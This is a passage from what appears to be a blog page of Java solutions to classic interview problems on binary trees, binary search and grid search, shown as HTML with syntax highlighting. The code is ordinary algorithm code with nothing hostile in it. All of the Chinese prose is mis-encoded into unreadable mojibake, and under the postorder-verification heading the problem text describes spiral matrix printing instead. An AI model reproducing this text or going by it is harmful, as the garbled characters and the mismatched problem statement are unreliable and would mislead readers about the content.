‘çš„æ·±åº¦ âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">TreeDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> Math.max(find(root.left,<span class="number">1</span>),find(root.right,<span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(TreeNode root,<span class="type">int</span> depth)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> depth;</span><br><span class="line">    <span class="keyword">return</span> Math.max(find(root.left,depth+<span class="number">1</span>),find(root.right,depth+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="åºåˆ—åŒ–äºŒå‰æ ‘-">åºåˆ—åŒ–äºŒå‰æ ‘ -</span></h2><p>è¯·å®ç°ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«ç”¨æ¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–äºŒå‰æ ‘</p><p>äºŒå‰æ ‘çš„åºåˆ—åŒ–æ˜¯æŒ‡ï¼šæŠŠä¸€æ£µäºŒå‰æ ‘æŒ‰ç…§æŸç§éå†æ–¹å¼çš„ç»“æœä»¥æŸç§æ ¼å¼ä¿å­˜ä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œä½¿å¾—å†…å­˜ä¸­å»ºç«‹èµ·æ¥çš„äºŒå‰æ ‘å¯ä»¥æŒä¹…ä¿å­˜ã€‚åºåˆ—åŒ–å¯ä»¥åŸºäºå…ˆåºã€ä¸­åºã€ååºã€å±‚åºçš„äºŒå‰æ ‘éå†æ–¹å¼æ¥è¿›è¡Œä¿®æ”¹ï¼Œåºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåºåˆ—åŒ–æ—¶é€šè¿‡ æŸç§ç¬¦å·è¡¨ç¤ºç©ºèŠ‚ç‚¹ï¼ˆ#ï¼‰ï¼Œä»¥ ï¼ è¡¨ç¤ºä¸€ä¸ªç»“ç‚¹å€¼çš„ç»“æŸï¼ˆvalue!ï¼‰ã€‚</p><p>äºŒå‰æ ‘çš„ååºåˆ—åŒ–æ˜¯æŒ‡ï¼šæ ¹æ®æŸç§éå†é¡ºåºå¾—åˆ°çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æœstrï¼Œé‡æ„äºŒå‰æ ‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    String <span class="title function_">Serialize</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> serial(root,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>());</span><br><span class="line">  &#125;</span><br><span class="line">    String <span class="title function_">serial</span><span class="params">(TreeNode root,StringBuilder sb )</span>&#123;        </span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            sb.append(<span class="string">&quot;#,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(root.val+<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        serial(root.left,sb);</span><br><span class="line">        serial(root.right,sb);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">Deserialize</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        String[] s=str.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> deserial(<span class="keyword">new</span> <span class="title class_">LinkedList</span>(Arrays.asList(s)));</span><br><span class="line">  &#125;</span><br><span class="line">    TreeNode <span class="title function_">deserial</span><span class="params">(LinkedList&lt;String&gt; l)</span>&#123;</span><br><span class="line">       <span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> l.poll();</span><br><span class="line">        <span class="keyword">if</span>(tmp.equals(<span class="string">&quot;#&quot;</span>)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        TreeNode root=<span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.valueOf(tmp));</span><br><span class="line">        root.left=deserial(l);</span><br><span class="line">        root.right=deserial(l);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªç»“ç‚¹">äºŒå‰æœç´¢æ ‘çš„ç¬¬kä¸ªç»“ç‚¹ âˆš</span></h2><p>ç»™å®šä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œè¯·æ‰¾å‡ºå…¶ä¸­çš„ç¬¬kå°çš„ç»“ç‚¹ã€‚ä¾‹å¦‚ï¼Œ ï¼ˆ5ï¼Œ3ï¼Œ7ï¼Œ2ï¼Œ4ï¼Œ6ï¼Œ8ï¼‰  ä¸­ï¼ŒæŒ‰ç»“ç‚¹æ•°å€¼å¤§å°é¡ºåºç¬¬ä¸‰å°ç»“ç‚¹çš„å€¼ä¸º4ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> TreeNode ret;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">KthNode</span><span class="params">(TreeNode pRoot, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    inOrder(pRoot, k);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode root, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span> || cnt &gt;= k)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inOrder(root.left, k);</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="keyword">if</span> (cnt == k)</span><br><span class="line">        ret = root;</span><br><span class="line">    inOrder(root.right, k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹-">äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹ -</span></h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘å’Œå…¶ä¸­çš„ä¸€ä¸ªç»“ç‚¹ï¼Œè¯·æ‰¾å‡ºä¸­åºéå†é¡ºåºçš„ä¸‹ä¸€ä¸ªç»“ç‚¹å¹¶ä¸”è¿”å›ã€‚æ³¨æ„ï¼Œæ ‘ä¸­çš„ç»“ç‚¹ä¸ä»…åŒ…å«å·¦å³å­ç»“ç‚¹ï¼ŒåŒæ—¶åŒ…å«æŒ‡å‘çˆ¶ç»“ç‚¹çš„æŒ‡é’ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> TreeLinkNode <span class="title function_">GetNext</span><span class="params">(TreeLinkNode pNode)</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">if</span>(pNode.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            TreeLinkNode tmp=pNode.right;</span><br><span class="line">           <span class="keyword">while</span>(tmp.left!=<span class="literal">null</span>)&#123;              </span><br><span class="line">               tmp=tmp.left;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> tmp;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           TreeLinkNode parent=pNode.next;</span><br><span class="line">           <span class="keyword">while</span>(parent!=<span class="literal">null</span>)&#123;</span><br><span class="line">              <span class="keyword">if</span>(parent.left==pNode) <span class="keyword">return</span> parent;</span><br><span class="line">               pNode=parent;</span><br><span class="line">               parent=parent.next;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="æ ‘çš„å­ç»“æ„">æ ‘çš„å­ç»“æ„ âˆš</span></h2><p>è¾“å…¥ä¸¤æ£µäºŒå‰æ ‘Aï¼ŒBï¼Œåˆ¤æ–­Bæ˜¯ä¸æ˜¯Açš„å­ç»“æ„ã€‚ï¼ˆpsï¼šæˆ‘ä»¬çº¦å®šç©ºæ ‘ä¸æ˜¯ä»»æ„ä¸€ä¸ªæ ‘çš„å­ç»“æ„ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">HasSubtree</span><span class="params">(TreeNode root1,TreeNode root2)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root1==<span class="literal">null</span>||root2==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">return</span> check(root1,root2)||HasSubtree(root1.left,root2)||HasSubtree(root1.right,root2);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(TreeNode root1,TreeNode root2)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(root2==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">if</span>(root1==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       <span class="keyword">return</span> root1.val==root2.val&amp;&amp;check(root1.left,root2.left)&amp;&amp;check(root1.right,root2.right);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„">äºŒå‰æ ‘ä¸­å’Œä¸ºæŸä¸€å€¼çš„è·¯å¾„ âˆš</span></h2><p>è¾“å…¥ä¸€é¢—äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹å’Œä¸€ä¸ªæ•´æ•°ï¼Œæ‰“å°å‡ºäºŒå‰æ ‘ä¸­ç»“ç‚¹å€¼çš„å’Œä¸ºè¾“å…¥æ•´æ•°çš„æ‰€æœ‰è·¯å¾„ã€‚è·¯å¾„å®šä¹‰ä¸ºä»æ ‘çš„æ ¹ç»“ç‚¹å¼€å§‹å¾€ä¸‹ä¸€ç›´åˆ°å¶ç»“ç‚¹æ‰€ç»è¿‡çš„ç»“ç‚¹å½¢æˆä¸€æ¡è·¯å¾„ã€‚(æ³¨æ„: åœ¨è¿”å›å€¼çš„listä¸­ï¼Œæ•°ç»„é•¿åº¦å¤§çš„æ•°ç»„é å‰)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; <span class="title function_">FindPath</span><span class="params">(TreeNode root,<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> find(root,target,<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;(),<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;ArrayList&lt;Integer&gt;&gt;());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; <span class="title function_">find</span><span class="params">(TreeNode root,<span class="type">int</span> target,ArrayList&lt;Integer&gt; tmp,ArrayList&lt;ArrayList&lt;Integer&gt;&gt; res)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">if</span>(target==root.val&amp;&amp;root.left==root.right)&#123;</span><br><span class="line">            tmp.add(root.val);</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(tmp));</span><br><span class="line">            tmp.remove(tmp.size()-<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp.add(root.val);</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="literal">null</span>)</span><br><span class="line">        find(root.left,target-root.val,tmp,res);</span><br><span class="line">        find(root.right,target-root.val,tmp,res);</span><br><span class="line">        tmp.remove(tmp.size()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æœç´¢æ ‘å’ŒåŒå‘é“¾è¡¨-">äºŒå‰æœç´¢æ ‘å’ŒåŒå‘é“¾è¡¨ -</span></h2><p>è¾“å…¥ä¸€æ£µäºŒå‰æœç´¢æ ‘ï¼Œå°†è¯¥äºŒå‰æœç´¢æ ‘è½¬æ¢æˆä¸€ä¸ªæ’åºçš„åŒå‘é“¾è¡¨ã€‚è¦æ±‚ä¸èƒ½åˆ›å»ºä»»ä½•æ–°çš„ç»“ç‚¹ï¼Œåªèƒ½è°ƒæ•´æ ‘ä¸­ç»“ç‚¹æŒ‡é’ˆçš„æŒ‡å‘ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">TreeNode</span> <span class="variable">head</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> TreeNode <span class="title function_">Convert</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    inOrder(root);</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inOrder</span><span class="params">(TreeNode node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inOrder(node.left);</span><br><span class="line">    node.left = pre;</span><br><span class="line">    <span class="keyword">if</span> (pre != <span class="literal">null</span>)</span><br><span class="line">        pre.right = node;</span><br><span class="line">    pre = node;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span>)</span><br><span class="line">        head = node;</span><br><span class="line">    inOrder(node.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ—">äºŒå‰æœç´¢æ ‘çš„ååºéå†åºåˆ— âˆš</span></h2><p>è¾“å…¥ä¸€ä¸ªçŸ©é˜µï¼ŒæŒ‰ç…§ä»å¤–å‘é‡Œä»¥é¡ºæ—¶é’ˆçš„é¡ºåºä¾æ¬¡æ‰“å°å‡ºæ¯ä¸€ä¸ªæ•°å­—ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥å¦‚ä¸‹4 X 4çŸ©é˜µï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 åˆ™ä¾æ¬¡æ‰“å°å‡ºæ•°å­—1,2,3,4,8,12,16,15,14,13,9,5,6,7,11,10.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">VerifySquenceOfBST</span><span class="params">(<span class="type">int</span> [] sequence)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(sequence.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=sequence.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> find(sequence,lo,hi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span>[] sequence,<span class="type">int</span> lo,<span class="type">int</span> hi)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(lo&gt;=hi) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> pivot=sequence[hi];</span><br><span class="line">    <span class="type">int</span> index=lo;</span><br><span class="line">    <span class="keyword">for</span>(;index&lt;hi;index++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sequence[index]&gt;pivot) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=index;i&lt;hi;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sequence[i]&lt;pivot) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> find(sequence,lo,index-<span class="number">1</span>)&amp;&amp;find(sequence,index,hi-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id></span></h1><h1><span id="äºŒåˆ†æŸ¥æ‰¾">äºŒåˆ†æŸ¥æ‰¾</span></h1><h2><span id="æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—">æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­— âˆš</span></h2><p>æŠŠä¸€ä¸ªæ•°ç»„æœ€å¼€å§‹çš„è‹¥å¹²ä¸ªå…ƒç´ æ¬åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ•°ç»„çš„æ—‹è½¬ã€‚<br>è¾“å…¥ä¸€ä¸ªéé€’å‡æ’åºçš„æ•°ç»„çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¾“å‡ºæ—‹è½¬æ•°ç»„çš„æœ€å°å…ƒç´ ã€‚<br>ä¾‹å¦‚æ•°ç»„{3,4,5,1,2}ä¸º{1,2,3,4,5}çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¯¥æ•°ç»„çš„æœ€å°å€¼ä¸º1ã€‚<br>NOTEï¼šç»™å‡ºçš„æ‰€æœ‰å…ƒç´ éƒ½å¤§äº0ï¼Œè‹¥æ•°ç»„å¤§å°ä¸º0ï¼Œè¯·è¿”å›0ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minNumberInRotateArray</span><span class="params">(<span class="type">int</span> [] array)</span> &#123;        </span><br><span class="line">        <span class="type">int</span> lo=<span class="number">0</span>,hi=array.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(array[lo]&lt;array[hi]) <span class="keyword">return</span> array[lo];</span><br><span class="line">        <span class="keyword">while</span>(lo&lt;hi)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(array[mid]&gt;array[array.length-<span class="number">1</span>]) lo=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> hi=mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array[lo];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><span id="æœç´¢">æœç´¢</span></h1><h2><span id="çŸ©é˜µä¸­çš„è·¯å¾„">çŸ©é˜µä¸­çš„è·¯å¾„ âˆš</span></h2><p>è¯·è®¾è®¡ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­åœ¨ä¸€ä¸ªçŸ©é˜µä¸­æ˜¯å¦å­˜åœ¨ä¸€æ¡åŒ…å«æŸå­—ç¬¦ä¸²æ‰€æœ‰å­—ç¬¦çš„è·¯å¾„ã€‚è·¯å¾„å¯ä»¥ä»çŸ©é˜µä¸­çš„ä»»æ„ä¸€ä¸ªæ ¼å­å¼€å§‹ï¼Œæ¯ä¸€æ­¥å¯ä»¥åœ¨çŸ©é˜µä¸­å‘å·¦ï¼Œå‘å³ï¼Œå‘ä¸Šï¼Œå‘ä¸‹ç§»åŠ¨ä¸€ä¸ªæ ¼å­ã€‚å¦‚æœä¸€æ¡è·¯å¾„ç»è¿‡äº†çŸ©é˜µä¸­çš„æŸä¸€ä¸ªæ ¼å­ï¼Œåˆ™è¯¥è·¯å¾„ä¸èƒ½å†è¿›å…¥è¯¥æ ¼å­ã€‚ ä¾‹å¦‚ </p><p><img src="/2020/04/07/%E5%89%91%E6%8C%87OFFER/image-20200408115329051.png" alt="image-20200408115329051"></p><p>çŸ©é˜µä¸­åŒ…å«ä¸€æ¡å­—ç¬¦ä¸²â€bccedâ€çš„è·¯å¾„ï¼Œä½†æ˜¯çŸ©é˜µä¸­ä¸åŒ…å«â€abcbâ€è·¯å¾„ï¼Œå› ä¸ºå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªå­—ç¬¦bå æ®äº†çŸ©é˜µä¸­çš„ç¬¬ä¸€è¡Œç¬¬äºŒä¸ªæ ¼å­ä¹‹åï¼Œè·¯å¾„ä¸èƒ½å†æ¬¡è¿›å…¥è¯¥æ ¼å­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">      <span class="type">int</span> dir[][] = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasPath</span><span class="params">(<span class="type">char</span>[] matrix, <span class="type">int</span> rows, <span class="type">int</span> cols, <span class="type">char</span>[] str)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">boolean</span> visited[] = <span class="keyword">new</span> <span class="title class_">boolean</span>[len];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;rows;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;cols;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (matrix[i*cols+j]==str[<span class="number">0</span>])&#123;</span><br><span class="line">                    visited[i*cols+j]=<span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span>(dfs(matrix,rows,cols,i,j,str,visited,<span class="number">0</span>))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    visited[i*cols+j]=<span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[] matrix, <span class="type">int</span> rows, <span class="type">int</span> cols, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">char</span>[] str, <span class="type">boolean</span>[] visited, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i*cols+j;</span><br><span class="line">        <span class="keyword">if</span>(k==str.length-<span class="number">1</span>&amp;&amp;str[k]==matrix[index]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] direct:dir)&#123;</span><br><span class="line">            <span class="type">int</span> x=i+direct[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> y=j+direct[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(x&lt;rows&amp;&amp;x&gt;=<span class="number">0</span>&amp;&amp;y&lt;cols&amp;&amp;y&gt;=<span class="number">0</span>&amp;&amp;visited[x*cols+y]==<span class="literal">false</span>&amp;&amp;str[k]==matrix[index])&#123;</span><br><span class="line">                visited[x*cols+y]=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(dfs(matrix,rows,cols,x,y,str,visited,k+<span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                visited[x*cols+y]=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="æœºå™¨äººçš„è¿åŠ¨èŒƒå›´">æœºå™¨äººçš„è¿åŠ¨èŒƒå›´ âˆš</span></h2><p>åœ°ä¸Šæœ‰ä¸€ä¸ªmè¡Œå’Œnåˆ—çš„æ–¹æ ¼ã€‚ä¸€ä¸ªæœºå™¨äººä»åæ ‡0,0çš„æ 